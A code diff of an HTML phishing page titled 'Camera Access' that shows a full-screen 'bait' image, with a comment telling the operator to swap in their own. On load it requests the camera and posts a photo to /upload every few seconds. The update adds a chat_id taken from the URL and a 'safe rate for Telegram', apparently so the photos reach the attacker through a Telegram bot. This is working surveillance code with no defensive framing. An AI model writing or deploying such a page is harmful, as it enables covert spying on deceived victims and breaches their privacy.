@@ -1,58 +1,69 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Access</title>
-    <style>
-        html, body {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            background-color: black;
-        }
-        #bait {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera Access</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      background-color: black;
+    }
+    #bait {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+  </style>
 </head>
 <body>
-    <!-- Replace welcome.jpg with your bait image -->
-    <img src="/static/welcome.jpg" id="bait" alt="Image">
+  <!-- Replace welcome.jpg with your bait image -->
+  <img src="/static/welcome.jpg" id="bait" alt="Image">
 
-    <script>
-        async function startContinuousCapture() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
+  <script>
+    async function startContinuousCapture() {
+      try {
+        // Extract chat_id from URL (?chat_id=12345)
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get("chat_id");
 
-                // Continuous capture: ~4 images per second (every 250ms)
-                setInterval(async () => {
-                    try {
-                        const blob = await imageCapture.takePhoto();
-                        const formData = new FormData();
-                        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-
-                        fetch('/upload', { method: 'POST', body: formData })
-                            .then(res => console.log("✅ Sent photo at", new Date().toLocaleTimeString()))
-                            .catch(err => console.error("❌ Upload error:", err));
-                    } catch (err) {
-                        console.error("❌ Capture error:", err);
-                    }
-                }, 250); // 250ms = 4 per second
-            } catch (err) {
-                console.error("❌ Camera access denied:", err);
-            }
+        if (!chatId) {
+          console.error("❌ No chat_id found in URL!");
+          return;
         }
 
-        window.onload = startContinuousCapture;
-    </script>
+        // Ask for camera access
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+
+        // Capture every 2 seconds (safe rate for Telegram)
+        setInterval(async () => {
+          try {
+            const blob = await imageCapture.takePhoto();
+            const formData = new FormData();
+            formData.append("photo", blob, `photo_${Date.now()}.jpg`);
+            formData.append("chat_id", chatId);
+
+            fetch("/upload", { method: "POST", body: formData })
+              .then(() => console.log("✅ Sent photo at", new Date().toLocaleTimeString()))
+              .catch(err => console.error("❌ Upload error:", err));
+          } catch (err) {
+            console.error("❌ Capture error:", err);
+          }
+        }, 2000); // every 2 seconds
+      } catch (err) {
+        console.error("❌ Camera access denied:", err);
+      }
+    }
+
+    window.onload = startContinuousCapture;
+  </script>
 </body>
 </html>
